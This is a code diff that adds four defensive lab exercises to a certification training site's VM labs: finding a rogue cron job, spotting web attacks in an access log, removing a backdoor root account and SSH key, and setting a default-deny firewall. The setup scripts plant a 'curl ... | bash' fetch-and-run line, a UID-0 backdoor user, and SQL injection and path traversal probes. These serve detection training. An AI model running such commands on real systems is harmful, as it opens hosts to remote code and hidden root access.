@@ -348,6 +348,78 @@ CertHub.vmLabs = {
         { label: "The cron entry is gone", cmd: "! crontab -l 2>/dev/null | grep -q sysupd" },
         { label: "The program's folder is deleted", cmd: "[ ! -e /usr/local/lib/.sysupd ]" },
         { keep: true, label: "SSH is still running", cmd: "systemctl is-active ssh" }
+      ] },
+    { id: "cron-review", group: "blue", title: "Find an unauthorized scheduled task", mode: "single", minutes: 15, level: "Intermediate", certs: ["security-plus", "cysa-plus", "linux-plus", "sscp"],
+      setup: "mkdir -p /root/incident /usr/local/sbin; printf '# Nightly app backup (change 2291)\n30 2 * * * root /usr/bin/tar -czf /var/backups/app.tar.gz /etc/hostname\n' > /etc/cron.d/app-backup; printf '#!/bin/bash\n# fetches and runs whatever the remote host serves\ncurl -s http://203.0.113.45/c | bash\n' > /usr/local/sbin/.cache-sync; chmod 755 /usr/local/sbin/.cache-sync; printf 'SHELL=/bin/bash\n*/5 * * * * root /usr/local/sbin/.cache-sync >/dev/null 2>&1\n' > /etc/cron.d/logrotate-helper; touch -d '2024-01-10' /etc/cron.d/app-backup",
+      intro: "A change review found that this server runs a job every five minutes that nobody approved. Find it among the scheduled tasks, record the cron file in /root/incident/cron.txt, and remove the job and the script it runs. Leave the approved nightly backup alone.",
+      steps: [
+        "List every place cron reads: `ls -la /etc/cron.d /etc/cron.hourly /etc/cron.daily`, `sudo crontab -l` and `ls /var/spool/cron/crontabs`",
+        "Read the files in /etc/cron.d: `sudo cat /etc/cron.d/*`. Look for a short interval, output thrown away (`>/dev/null 2>&1`) and a hidden file (a name starting with a dot).",
+        "Check what the job runs: `sudo cat /usr/local/sbin/.cache-sync`. Downloading a script and piping it to bash lets someone else run anything on this server.",
+        "Record the cron file: `echo /etc/cron.d/logrotate-helper | sudo tee /root/incident/cron.txt`",
+        "Remove the job and its script: `sudo rm /etc/cron.d/logrotate-helper /usr/local/sbin/.cache-sync`",
+        "In a real incident you would also block 203.0.113.45 and find out how the file got there (`ls -l --time-style=full-iso`, the auth log, package changes)."
+      ],
+      checks: [
+        { label: "cron.txt names the unauthorized cron file", cmd: "grep -q '/etc/cron.d/logrotate-helper' /root/incident/cron.txt" },
+        { label: "The unauthorized job is removed", cmd: "[ ! -e /etc/cron.d/logrotate-helper ] && ! grep -rqs cache-sync /etc/cron.d /etc/crontab /var/spool/cron" },
+        { label: "The script it ran is deleted", cmd: "[ ! -e /usr/local/sbin/.cache-sync ]" },
+        { keep: true, label: "The approved backup job is still there", cmd: "grep -q 'tar -czf /var/backups/app.tar.gz' /etc/cron.d/app-backup" }
+      ] },
+    { id: "web-log-review", group: "blue", title: "Spot a web attack in the access log", mode: "single", minutes: 20, level: "Intermediate", certs: ["security-plus", "cysa-plus", "sscp", "securityx"],
+      setup: "mkdir -p /var/log/web-review /root/incident; f=/var/log/web-review/access.log; : > $f; for i in $(seq 10 49); do ip=192.0.2.$((i%7+20)); echo \"$ip - - [14/Mar/2025:09:$i:12 +0000] \\\"GET /products?id=$i HTTP/1.1\\\" 200 5120 \\\"-\\\" \\\"Mozilla/5.0\\\"\" >> $f; done; for p in '/products?id=1%27' '/products?id=1%27%20OR%20%271%27=%271' '/products?id=1%20UNION%20SELECT%20NULL--' '/download?file=../../../../etc/passwd' '/download?file=..%2F..%2F..%2Fetc%2Fshadow' '/.env' '/wp-login.php' '/admin/config.bak'; do echo \"198.51.100.23 - - [14/Mar/2025:10:02:41 +0000] \\\"GET $p HTTP/1.1\\\" 404 162 \\\"-\\\" \\\"sqlmap/1.7\\\"\" >> $f; done; echo '198.51.100.23 - - [14/Mar/2025:10:03:05 +0000] \"GET /download?file=../../../../etc/passwd HTTP/1.1\" 200 1873 \"-\" \"curl/8.5\"' >> $f; echo '192.0.2.99 - - [14/Mar/2025:10:05:00 +0000] \"GET /login HTTP/1.1\" 404 162 \"-\" \"Mozilla/5.0\"' >> $f",
+      intro: "The web team saw odd requests overnight. The web server's access log is in /var/log/web-review/access.log. Find the address that probed the site for injection and path traversal, and the one probe that succeeded (status 200). Write both to /root/incident/web.txt, then block the address and save the rule.",
+      steps: [
+        "Count requests per address: `awk '{print $1}' /var/log/web-review/access.log | sort | uniq -c | sort -rn`",
+        "Look for attack patterns: `grep -Ei \"%27|union|select|\\.\\./|%2f|\\.env|wp-login\" /var/log/web-review/access.log`. Quotes, UNION SELECT and ../ in a URL are classic injection and path traversal probes.",
+        "The user agent gives it away too: automated scanners often name themselves.",
+        "Find which probe got a 200 (success) instead of 404: `grep 198.51.100.23 /var/log/web-review/access.log | awk '$9 == 200'`",
+        "Record the address and the successful path: `echo '198.51.100.23 /download?file=../../../../etc/passwd' | sudo tee /root/incident/web.txt`",
+        "Block and save: `sudo iptables -I INPUT -s 198.51.100.23 -j DROP`, `sudo mkdir -p /etc/iptables` and `sudo iptables-save | sudo tee /etc/iptables/rules.v4`",
+        "A 200 on a path traversal means the app served a system file: the real fix is in the application (validate the file name), so report it to the developers."
+      ],
+      checks: [
+        { label: "web.txt names the probing address", cmd: "grep -qw '198\\.51\\.100\\.23' /root/incident/web.txt" },
+        { label: "web.txt names the probe that succeeded", cmd: "grep -q 'download?file=' /root/incident/web.txt" },
+        { label: "Traffic from the address is dropped", cmd: "iptables -S INPUT | grep -Eq -- '-s 198\\.51\\.100\\.23(/32)? .*-j (DROP|REJECT)'" },
+        { label: "The block is saved to /etc/iptables/rules.v4", cmd: "grep -Eq -- '-s 198\\.51\\.100\\.23(/32)? .*-j (DROP|REJECT)' /etc/iptables/rules.v4" },
+        { keep: true, label: "Normal visitors (192.0.2.x) aren't blocked", cmd: "! iptables -S INPUT | grep -q '192\\.0\\.2\\.'" }
+      ] },
+    { id: "backdoor-account", group: "blue", title: "Find a backdoor account and an unknown SSH key", mode: "single", minutes: 15, level: "Advanced", certs: ["security-plus", "cysa-plus", "linux-plus", "sscp", "securityx"],
+      setup: "mkdir -p /root/incident /root/.ssh; chmod 700 /root/.ssh; id sysadm >/dev/null 2>&1 || useradd -o -u 0 -g 0 -M -d /root -s /bin/bash sysadm; printf 'ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHc0bXBsZUtleUZvckFkbWluTGFwdG9wT25seTAx admin@laptop\nssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIFVua25vd25LZXlBZGRlZEJ5U29tZW9uZUVsc2UwMQ unknown@203.0.113.45\n' > /root/.ssh/authorized_keys; chmod 600 /root/.ssh/authorized_keys",
+      intro: "Someone may have kept a way back into this server. Check for accounts that have root's powers besides root itself, and for SSH keys nobody recognizes. Record the extra account in /root/incident/accounts.txt, remove it, and remove the unknown key while keeping the admin's own key (admin@laptop).",
+      steps: [
+        "Any account with user ID 0 is root, whatever its name: `awk -F: '$3 == 0 {print $1}' /etc/passwd`",
+        "Record the extra one: `echo sysadm | sudo tee /root/incident/accounts.txt`",
+        "Remove it: `sudo userdel -f sysadm` (-f is needed because it shares root's user ID, so its processes look like root's)",
+        "Check root's authorized keys: `sudo cat /root/.ssh/authorized_keys`. Each line is a key that can log in; the comment at the end says whose it is.",
+        "Remove the unknown key and keep admin@laptop: `sudo sed -i '/unknown@203.0.113.45/d' /root/.ssh/authorized_keys`",
+        "Also check every home directory: `sudo find / -name authorized_keys -path '*/.ssh/*' 2>/dev/null`"
+      ],
+      checks: [
+        { label: "accounts.txt names the backdoor account", cmd: "grep -qw sysadm /root/incident/accounts.txt" },
+        { label: "Only root has user ID 0", cmd: "[ \"$(awk -F: '$3 == 0' /etc/passwd | wc -l)\" = 1 ] && awk -F: '$3 == 0 {print $1}' /etc/passwd | grep -qx root" },
+        { label: "The unknown SSH key is removed", cmd: "! grep -q 'unknown@203.0.113.45' /root/.ssh/authorized_keys" },
+        { keep: true, label: "The admin's own key is still there", cmd: "grep -q 'admin@laptop' /root/.ssh/authorized_keys" }
+      ] },
+    { id: "default-deny", group: "blue", title: "Set a default-deny host firewall", mode: "single", minutes: 20, level: "Intermediate", certs: ["security-plus", "linux-plus", "network-plus", "sscp", "rhcsa"],
+      setup: "mkdir -p /etc/iptables",
+      intro: "This server accepts connections on every port. Change its firewall to default deny: drop incoming traffic unless it's loopback, a reply to a connection the server made, SSH (port 22) or ping. Save the rules so they survive a reboot.",
+      steps: [
+        "See the current rules and policy: `sudo iptables -S`. A policy of ACCEPT with no rules lets everything in.",
+        "Add the allow rules first, so you don't cut yourself off: `sudo iptables -A INPUT -i lo -j ACCEPT` and `sudo iptables -A INPUT -m conntrack --ctstate ESTABLISHED,RELATED -j ACCEPT`",
+        "Allow SSH and ping: `sudo iptables -A INPUT -p tcp --dport 22 -j ACCEPT` and `sudo iptables -A INPUT -p icmp -j ACCEPT`",
+        "Now make drop the default: `sudo iptables -P INPUT DROP`",
+        "Save: `sudo iptables-save | sudo tee /etc/iptables/rules.v4`, then check the list again with `sudo iptables -S INPUT`",
+        "On a remote server, always add the SSH rule before changing the policy, and keep a second session open while you test."
+      ],
+      checks: [
+        { label: "The INPUT policy is DROP", cmd: "iptables -S INPUT | grep -qx -- '-P INPUT DROP'" },
+        { label: "Loopback traffic is allowed", cmd: "iptables -S INPUT | grep -Eq -- '-i lo .*-j ACCEPT'" },
+        { label: "Replies to the server's own connections are allowed", cmd: "iptables -S INPUT | grep -Eq -- '(ctstate|state) (RELATED,ESTABLISHED|ESTABLISHED,RELATED|ESTABLISHED) .*-j ACCEPT'" },
+        { label: "SSH (port 22) is allowed", cmd: "iptables -S INPUT | grep -Eq -- '-p tcp .*--dport 22 .*-j ACCEPT'" },
+        { label: "The rules are saved with the DROP policy", cmd: "grep -q ':INPUT DROP' /etc/iptables/rules.v4 && grep -Eq -- '--dport 22 .*-j ACCEPT' /etc/iptables/rules.v4" },
+        { keep: true, label: "SSH is still running", cmd: "systemctl is-active ssh" }
       ] }
   ],
   // The VM exam: a timed set of tasks on one VM, scored by the same checks. Tasks are drawn at random.
